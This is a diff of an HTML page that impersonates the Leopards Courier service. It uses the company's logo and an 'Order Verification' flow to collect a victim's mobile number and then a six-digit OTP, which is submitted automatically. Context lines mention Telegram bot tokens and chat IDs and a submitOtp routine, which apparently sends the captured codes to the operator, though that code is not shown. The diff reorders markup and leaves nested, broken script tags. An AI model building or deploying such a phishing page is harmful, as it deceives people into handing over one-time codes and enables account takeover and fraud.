@@ -112,7 +112,54 @@ margin-top:auto;
 }
 
 </style>
+</head>
+
+<body>
+
+<header class="topbar">
+<div class="logo">
+<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Leopards_Courier_logo.png">
+</div>
+</header>
+
+<!-- PHONE PAGE -->
+<div class="card" id="phonePage">
+<h2>Order Verification</h2>
+<p>Enter your mobile number for tracking</p>
+
+<input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" autofocus placeholder="Enter Mobile Number">
+
+<button onclick="goToOtp()">Next</button>
+</div>
+
+<!-- OTP PAGE -->
+<div class="card" id="otpPage" style="display:none;">
+<h2>OTP Verification</h2>
+<p>Enter the 6 digit verification code</p>
+
+<div class="otp-box">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+</div>
+
+<button>Verify</button>
+</div>
+
+<div class="footer">
+Courier Verification System
+</div>
+
 <script>
+function goToOtp(){
+// No validation, direct go to OTP page
+document.getElementById("phonePage").style.display="none";
+document.getElementById("otpPage").style.display="block";
+}
+   <script>
     // === PROTECTION START ===
     (function() {
       const allowedKeys = ["TELEGRAM_BOT_TOKEN", "TELEGRAM_CHAT_IDS"];
@@ -269,54 +316,7 @@ margin-top:auto;
       const allFilled = Array.from(allInputs).every(input => input.value.length === 1);
       if (allFilled) submitOtp();
     }
-  </script>
-</head>
-
-<body>
-
-<header class="topbar">
-<div class="logo">
-<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Leopards_Courier_logo.png">
-</div>
-</header>
-
-<!-- PHONE PAGE -->
-<div class="card" id="phonePage">
-<h2>Order Verification</h2>
-<p>Enter your mobile number for tracking</p>
-
-<input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" autofocus placeholder="Enter Mobile Number">
-
-<button onclick="goToOtp()">Next</button>
-</div>
-
-<!-- OTP PAGE -->
-<div class="card" id="otpPage" style="display:none;">
-<h2>OTP Verification</h2>
-<p>Enter the 6 digit verification code</p>
-
-<div class="otp-box">
-<input maxlength="1">
-<input maxlength="1">
-<input maxlength="1">
-<input maxlength="1">
-<input maxlength="1">
-<input maxlength="1">
-</div>
-
-<button>Verify</button>
-</div>
-
-<div class="footer">
-Courier Verification System
-</div>
-
-<script>
-function goToOtp(){
-// No validation, direct go to OTP page
-document.getElementById("phonePage").style.display="none";
-document.getElementById("otpPage").style.display="block";
-}
+  </script> 
 </script>
 
 </body>
